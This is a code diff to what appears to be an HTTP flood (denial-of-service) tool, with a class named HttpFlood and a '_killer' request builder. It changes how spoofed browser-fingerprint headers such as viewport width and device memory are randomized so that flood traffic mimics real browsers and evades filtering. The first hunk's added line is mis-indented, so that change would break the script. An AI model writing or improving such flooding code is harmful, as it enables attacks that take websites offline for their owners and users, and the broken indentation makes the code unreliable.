@@ -1670,7 +1670,7 @@ class HttpFlood(Thread):
         if fp.get("device_memory") and rc([True, False, False, False, False]):
             headers["device-memory"] = rc(fp["device_memory"])
         if fp.get("viewport") and rc([True, False, False, False, False, False]):
-            vp = fp["viewport"].split("x")
+        vp = rc(fp["viewport"]).split("x") if isinstance(fp["viewport"], list) else fp["viewport"].split("x")
             headers["viewport-width"] = vp[0]
             if rc([True, False]):
                 headers["width"] = rc(("1920", "2560", "1366", "1536"))
@@ -1783,7 +1783,7 @@ class HttpFlood(Thread):
         if fp.get("device_memory") and rc([True, False, False, False, False]):
             parts.append("Device-Memory: %s\r\n" % rc(fp["device_memory"]))
         if fp.get("viewport") and rc([True, False, False, False, False, False]):
-            parts.append("Viewport-Width: %s\r\n" % fp["viewport"].split("x")[0])
+            parts.append("Viewport-Width: %s\r\n" % (rc(fp["viewport"]).split("x")[0] if isinstance(fp["viewport"], list) else fp["viewport"].split("x")[0]))
         if fp.get("ect") and rc([True, False, False, False, False, False, False]):
             parts.append("ECT: %s\r\n" % rc(fp["ect"]))
             parts.append("RTT: %s\r\n" % rc(fp["rtt"]))
@@ -2421,7 +2421,7 @@ def _killer_build_request_standalone(method, path, fp, target_authority,
     if fp.get("device_memory") and rc([True, False, False, False, False]):
         headers["device-memory"] = rc(fp["device_memory"])
     if fp.get("viewport") and rc([True, False, False, False, False, False]):
-        vp = fp["viewport"].split("x")
+        vp = rc(fp["viewport"]).split("x") if isinstance(fp["viewport"], list) else fp["viewport"].split("x")
         headers["viewport-width"] = vp[0]
     if fp.get("ect") and rc([True, False, False, False, False, False, False]):
         headers["ect"] = rc(fp["ect"])
